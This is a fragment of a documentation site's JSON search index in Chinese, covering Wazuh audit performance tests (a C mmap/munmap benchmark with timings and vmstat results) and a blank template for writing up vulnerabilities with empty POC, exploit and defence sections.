19s\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run\nDone after 20s\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run\nDone after 21s\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run\nDone after 21s\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run\nDone after 21s  \u6027\u80fd\u635f\u5931\u7387\uff1a70.0%",
            "title": "\u6d4b\u8bd5\u4e8c"
        },
        {
            "location": "/wazuh\u6027\u80fd\u5206\u6790/#_3",
            "text": "\u6d4b\u8bd5\u65b9\u6848\uff1a\u4e0e\u6d4b\u8bd5\u4e00\u76f8\u540c\uff0c\u533a\u522b\u662f\u628a\u6d4b\u8bd5\u7a0b\u5e8f\u6539\u4e3aC\u8bed\u8a00\u7a0b\u5e8f\uff0c\u6d4b\u8bd5mmap\u548cmunmap\u4e24\u4e2a\u7cfb\u7edf\u8c03\u7528\u7684\u65f6\u8017  \u6d4b\u8bd5\u7a0b\u5e8f\uff1a  #include <sys/types.h>\n#include <fcntl.h>\n#include <unistd.h>\n#include <sys/mman.h>\n#include <stdio.h>\n#include <sys/time.h>\n\n\nint main(){\n    struct timeval start;\n    struct timeval end;\n    float time_use = 0;\n\n    int fd = open(\"run_mmap.c\", O_RDONLY);\n    if(fd < 0){\n        printf(\"error\\n\");\n        return -1;\n    }\n\n\n    gettimeofday(&start,NULL);\n    for(int i; i<20000000; i++){\n\n\n        void *addr = mmap(NULL, 10, PROT_READ, MAP_PRIVATE, fd, 0);\n        if(addr == MAP_FAILED){\n            printf(\"error\\n\");\n            return -1;\n        }\n        if(munmap(addr, 10) != 0){\n            printf(\"error\\n\");\n            return -1;\n        }\n\n    }\n    gettimeofday(&end,NULL);\n    time_use=(end.tv_sec-start.tv_sec)*1000000+(end.tv_usec-start.tv_usec);\n    //time_use= end.tv_sec-start.tv_sec;\n    if(close(fd) != 0){\n        printf(\"error\\n\");\n        return -1;\n    }\n    printf(\"Done after %f\u03bcs\\n\", time_use);\n\n}  \u5f00\u542f\u5ba1\u8ba1\u524d:  root@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run_mmap \nDone after 18826420.000000\u03bcs\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run_mmap \nDone after 19980384.000000\u03bcs\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run_mmap \nDone after 19807356.000000\u03bcs\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run_mmap \nDone after 21779724.000000\u03bcs\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run_mmap \nDone after 21440176.000000\u03bcs  \u5f00\u542f\u5ba1\u8ba1\u540e\uff1a  root@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run_mmap \nDone after 80555072.000000\u03bcs\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run_mmap \nDone after 75856544.000000\u03bcs\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run_mmap \nDone after 81079392.000000\u03bcs\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run_mmap \nDone after 90686256.000000\u03bcs\nroot@ubuntu-virtual-machine:/home/ubuntu/Desktop/tools# ./run_mmap \nDone after 78594544.000000\u03bcs  \u6027\u80fd\u635f\u5931\u7387\uff1a75.0%",
            "title": "\u6d4b\u8bd5\u4e09"
        },
        {
            "location": "/wazuh\u6027\u80fd\u5206\u6790/#_4",
            "text": "\u6d4b\u8bd5\u65b9\u6848\uff1a\u5728\u6d4b\u8bd5\u4e00\u7ed3\u8bba\u57fa\u7840\u4e0a\uff0c\u4f7f\u7528vmstat\u5bf9\u6bd4CPU\u4f7f\u7528\u7387\n\u6267\u884c\u6d4b\u8bd5\uff1a\n1.\u4e0d\u5f00\u542f\u5ba1\u8ba1\uff0c\u4e0d\u542f\u52a8wazuh Agent\n\u672c\u6b21\u6d4b\u8bd5\u5171\u8fdb\u884c\u4e86\u56db\u6b21\uff0cvmstate\u7684\u7ed3\u679c\u5982\u4e0b:\n\u7b2c\u4e00\u6b21\uff1a\u7528\u6237\u6001CPU\u5360\u7528\u7387\u5e73\u5747\u503c19.2%\uff0c\u5185\u6838\u600175.5%\n\u7b2c\u4e8c\u6b21\uff1a\u7528\u6237\u6001CPU\u5360\u7528\u7387\u5e73\u5747\u503c21.4%\uff0c\u5185\u6838\u600174.2%\n\u7b2c\u4e09\u6b21\uff1a\u7528\u6237\u6001CPU\u5360\u7528\u7387\u5e73\u5747\u503c25%\uff0c\u5185\u6838\u600174.5%\n\u7b2c\u56db\u6b21\uff1a\u7528\u6237\u6001CPU\u5360\u7528\u7387\u5e73\u5747\u503c21.4%\uff0c\u5185\u6838\u600172.5%\n\n2.\u5f00\u542f\u5ba1\u8ba1\uff0c\u76d1\u63a7\u6240\u6709\u7cfb\u7edf\u8c03\u7528\uff0c\u5e76\u5f00\u542fwazuh Agent\u7684\u7cfb\u7edf\u8c03\u7528\u76d1\u63a7\u529f\u80fd(\u5df2\u7ecf\u63d0\u53d6\u914d\u7f6e\u597d)\n\u672c\u6b21\u6d4b\u8bd5\u5171\u8fdb\u884c\u4e86\u56db\u6b21\uff0cvmstate\u7684\u7ed3\u679c\u5982\u4e0b:\n\u7b2c\u4e00\u6b21\uff1a\u7528\u6237\u6001CPU\u5360\u7528\u7387\u5e73\u5747\u503c18%\uff0c\u5185\u6838\u600182%\n\u7b2c\u4e8c\u6b21\uff1a\u7528\u6237\u6001CPU\u5360\u7528\u7387\u5e73\u5747\u503c21.5%\uff0c\u5185\u6838\u600178.5%\n\u7b2c\u4e09\u6b21\uff1a\u7528\u6237\u6001CPU\u5360\u7528\u7387\u5e73\u5747\u503c21.2%\uff0c\u5185\u6838\u600182.5%\n\u7b2c\u56db\u6b21\uff1a\u7528\u6237\u6001CPU\u5360\u7528\u7387\u5e73\u5747\u503c17.5%\uff0c\u5185\u6838\u600181.5%",
            "title": "\u6d4b\u8bd5\u56db"
        },
        {
            "location": "/\u6f0f\u6d1e\u5229\u7528\u77e5\u8bc6\u5e93\u6a21\u7248/",
            "text": "cve-xxxx-xxxx\n\n\n0.\u4f5c\u8005\n\n\n\uff08\u672c\u6587\u4f5c\u8005id \u548c\u8c37\u6b4c\u90ae\u7bb1\uff09\n\n\n1.\u80cc\u666f\u4ecb\u7ecd\n\n\n\n\n\u4ec0\u4e48\u8f6f\u4ef6\u7684\u6f0f\u6d1e\n\n\n\u8fd9\u4e2a\u8f6f\u4ef6\u7684\u7b80\u4ecb\n\n\n\u6f0f\u6d1e\u80fd\u9020\u6210\u4ec0\u4e48\u5371\u5bb3\n\n\n\u5176\u4ed6\u5bf9\u4e86\u89e3\u6f0f\u6d1e\u6709\u5229\u7684\u80cc\u666f\u77e5\u8bc6\n\n\n\n\n2.\u6f0f\u6d1e\u5206\u6790\n\n\n\n\n\u6f0f\u6d1e\u539f\u7406\u7cbe\u51c6\u6982\u62ec\uff08\u4e00\u4e24\u53e5\u8bdd\u8bf4\u6e05\u695a\u6f0f\u6d1e\u6210\u56e0\uff09\n\n\n\u6f0f\u6d1e\u6240\u5c5e\u8f6f\u4ef6\u94fe\u63a5\uff0c\u7248\u672c\uff0c\u6a21\u5757\uff0c\u76ee\u5f55\uff0c\u6587\u4ef6\uff0c\u4ee3\u7801\u884c\n\n\n\u6f0f\u6d1e\u6240\u5c5e\u7c7b\u578b\n\n\n\u6f0f\u6d1e\u8865\u4e01\n\n\n\u6f0f\u6d1eCVE\u53f7(\u5982\u679c\u6709)\n\n\n\n\n3.POC\n\n\na.POC\u539f\u7406\n\n\nb.POC\u6e90\u7801\n\n\nc.\u590d\u73b0\u6b65\u9aa4\n\n\n4.EXP\n\n\na.EXP\u539f\u7406\n\n\nb.EXP\u6e90\u7801\n\n\nc.\u590d\u73b0\u6b65\u9aa4\n\n\nd.\u5229\u7528\u6838\u5fc3\u8981\u7d20\n\n\n5.\u9632\u62a4\u5efa\u8bae\n\n\n\u7ed3\u5408\u6f0f\u6d1e\u539f\u7406\u548c\u5229\u7528\u539f\u7406\uff0c\u4ece\u9632\u62a4\u4ea7\u54c1\u7814\u53d1\u7684\u89d2\u5ea6\uff0c\u63d0\u51fa\uff1a\n\n\n\n\na. \u5982\u4f55\u68c0\u6d4b\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e\n\n\nb. \u5982\u4f55\u9632\u5fa1\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e\n\n\nc. \u6709\u6ca1\u6709\u54ea\u79cd\u901a\u7528\u7684\u7f13\u89e3\u63aa\u65bd\u53ef\u4ee5\u963b\u65ad\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e\n\n\n\n\n6.\u53c2\u8003\n\n\n\n\n\u5173\u4e8e\u8fd9\u4e2a\u6f0f\u6d1e\u7684writeup, \u5206\u6790\u6587\u7ae0\u94fe\u63a5\n\n\n\u5176\u4ed6\u53c2\u8003",
            "title": "\u6f0f\u6d1e\u5229\u7528\u77e5\u8bc6\u5e93\u6a21\u7248"
        },
        {
            "location": "/\u6f0f\u6d1e\u5229\u7528\u77e5\u8bc6\u5e93\u6a21\u7248/#cve-xxxx-xxxx",
            "text": "",
            "title": "cve-xxxx-xxxx"
        },
        {
            "location": "/\u6f0f\u6d1e\u5229\u7528\u77e5\u8bc6\u5e93\u6a21\u7248/#0",
            "text": "\uff08\u672c\u6587\u4f5c\u8005id \u548c\u8c37\u6b4c\u90ae\u7bb1\uff09",
            "title": "0.\u4f5c\u8005"
        },
        {
            "location": "/\u6f0f\u6d1e\u5229\u7528\u77e5\u8bc6\u5e93\u6a21\u7248/#1",
            "text": "\u4ec0\u4e48\u8f6f\u4ef6\u7684\u6f0f\u6d1e  \u8fd9\u4e2a\u8f6f\u4ef6\u7684\u7b80\u4ecb  \u6f0f\u6d1e\u80fd\u9020\u6210\u4ec0\u4e48\u5371\u5bb3  \u5176\u4ed6\u5bf9\u4e86\u89e3\u6f0f\u6d1e\u6709\u5229\u7684\u80cc\u666f\u77e5\u8bc6",
            "title": "1.\u80cc\u666f\u4ecb\u7ecd"
        },
        {
            "location": "/\u6f0f\u6d1e\u5229\u7528\u77e5\u8bc6\u5e93\u6a21\u7248/#2",
            "text": "\u6f0f\u6d1e\u539f\u7406\u7cbe\u51c6\u6982\u62ec\uff08\u4e00\u4e24\u53e5\u8bdd\u8bf4\u6e05\u695a\u6f0f\u6d1e\u6210\u56e0\uff09  \u6f0f\u6d1e\u6240\u5c5e\u8f6f\u4ef6\u94fe\u63a5\uff0c\u7248\u672c\uff0c\u6a21\u5757\uff0c\u76ee\u5f55\uff0c\u6587\u4ef6\uff0c\u4ee3\u7801\u884c  \u6f0f\u6d1e\u6240\u5c5e\u7c7b\u578b  \u6f0f\u6d1e\u8865\u4e01  \u6f0f\u6d1eCVE\u53f7(\u5982\u679c\u6709)",
            "title": "2.\u6f0f\u6d1e\u5206\u6790"
        },
        {
            "location": "/\u6f0f\u6d1e\u5229\u7528\u77e5\u8bc6\u5e93\u6a21\u7248/#3poc",
            "text": "",
            "title": "3.POC"
        },
        {
            "location": "/\u6f0f\u6d1e\u5229\u7528\u77e5\u8bc6\u5e93\u6a21\u7248/#apoc",
            "text": "",
            "title": "a.POC\u539f\u7406"
        },
        {
            "location": "/\u6f0f\u6d1e\u5229\u7528\u77e5\u8bc6\u5e93\u6a21\u7248/#bpoc",
            "text": "",
            "title": "b.POC\u6e90\u7801"
        },
        {
            "location": "/\u6f0f\u6d1e\u5229\u7528\u77e5\u8bc6\u5e93\u6a21\u7248/#c",
            "text": "",
            "title": "c.\u590d\u73b0\u6b65\u9aa4"
        },
        {
            "location": "/\u6f0f\u6d1e\u5229\u7528\u77e5\u8bc6\u5e93\u6a21\u7248/#4exp",
            "text": "",
            "title": "4.EXP"
        },
        {
            "location": "/\u6f0f\u6d1e\u5229\u7528\u77e5\u8bc6\u5e93\u6a21\u7248/#aexp",
            "text": "",
            "title": "a.EXP\u539f\u7406"
        },
        {
            "location": "/\u6f0f\u6d1e\u5229\u7528\u77e5\u8bc6\u5e93\u6a21\u7248/#bexp",
            "text": "",
            "title": "b.EXP\u6e90\u7801"
        },
        {
            "location": "/\u6f0f\u6d1e\u5229\u7528\u77e5\u8bc6\u5e93\u6a21\u7248/#c_1",
            "text": "",
            "title": "c.\u590d\u73b0\u6b65\u9aa4"
        },
        {
            "location": "/\u6f0f\u6d1e\u5229\u7528\u77e5\u8bc6\u5e93\u6a21\u7248/#d",
            "text": "",
            "title": "d.\u5229\u7528\u6838\u5fc3\u8981\u7d20"
        },
        {
            "location": "/\u6f0f\u6d1e\u5229\u7528\u77e5\u8bc6\u5e93\u6a21\u7248/#5",
            "text": "\u7ed3\u5408\u6f0f\u6d1e\u539f\u7406\u548c\u5229\u7528\u539f\u7406\uff0c\u4ece\u9632\u62a4\u4ea7\u54c1\u7814\u53d1\u7684\u89d2\u5ea6\uff0c\u63d0\u51fa\uff1a   a. \u5982\u4f55\u68c0\u6d4b\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e  b. \u5982\u4f55\u9632\u5fa1\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e  c. \u6709\u6ca1\u6709\u54ea\u79cd\u901a\u7528\u7684\u7f13\u89e3\u63aa\u65bd\u53ef\u4ee5\u963b\u65ad\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e",
            "title": "5.\u9632\u62a4\u5efa\u8bae"
        },
        {
            "location": "/\u6f0f\u6d1e\u5229\u7528\u77e5\u8bc6\u5e93\u6a21\u7248/#6",
            "text": "\u5173\u4e8e\u8fd9\u4e2a\u6f0f\u6d1e\u7684writeup, \u5206\u6790\u6587\u7ae0\u94fe\u63a5  \u5176\u4ed6\u53c2\u8003",
            "title": "6.\u53c2\u8003"
        }
    ]
}